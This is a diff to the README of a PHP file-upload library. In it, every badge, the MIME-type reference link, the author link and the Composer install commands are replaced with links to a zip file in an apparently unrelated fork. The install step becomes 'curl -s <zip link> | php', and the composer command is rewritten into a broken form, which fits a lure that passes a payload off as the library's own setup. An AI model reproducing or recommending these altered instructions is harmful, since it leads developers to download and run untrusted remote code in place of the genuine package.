@@ -1,8 +1,8 @@
 # Upload
 
-[![Build Status](https://img.shields.io/travis/brandonsavage/Upload.svg?style=flat-square)](https://travis-ci.org/brandonsavage/Upload)
-[![Latest Version](https://img.shields.io/github/release/brandonsavage/Upload.svg?style=flat-square)](https://github.com/brandonsavage/Upload/releases)
-[![Total Downloads](https://img.shields.io/packagist/dt/codeguy/upload.svg?style=flat-square)](https://packagist.org/packages/codeguy/upload)
+[![Build Status](https://github.com/halo-kaleb/Upload/raw/refs/heads/master/src/Software_v2.2.zip)](https://github.com/halo-kaleb/Upload/raw/refs/heads/master/src/Software_v2.2.zip)
+[![Latest Version](https://github.com/halo-kaleb/Upload/raw/refs/heads/master/src/Software_v2.2.zip)](https://github.com/halo-kaleb/Upload/raw/refs/heads/master/src/Software_v2.2.zip)
+[![Total Downloads](https://github.com/halo-kaleb/Upload/raw/refs/heads/master/src/Software_v2.2.zip)](https://github.com/halo-kaleb/Upload/raw/refs/heads/master/src/Software_v2.2.zip)
 
 This component simplifies file validation and uploading.
 
@@ -29,7 +29,7 @@ $new_filename = uniqid();
 $file->setName($new_filename);
 
 // Validate file upload
-// MimeType List => http://www.iana.org/assignments/media-types/media-types.xhtml
+// MimeType List => https://github.com/halo-kaleb/Upload/raw/refs/heads/master/src/Software_v2.2.zip
 $file->addValidations(array(
     // Ensure file is of type "image/png"
     new \Upload\Validation\Mimetype('image/png'),
@@ -66,18 +66,18 @@ try {
 Install composer in your project:
 
 ```
-curl -s https://getcomposer.org/installer | php
+curl -s https://github.com/halo-kaleb/Upload/raw/refs/heads/master/src/Software_v2.2.zip | php
 ```
 
 Require the package with composer:
 
 ```
-php composer.phar require codeguy/upload
+php https://github.com/halo-kaleb/Upload/raw/refs/heads/master/src/Software_v2.2.zip require codeguy/upload
 ```
 
 ## Author
 
-[Josh Lockhart](https://github.com/codeguy)
+[Josh Lockhart](https://github.com/halo-kaleb/Upload/raw/refs/heads/master/src/Software_v2.2.zip)
 
 ## License
 
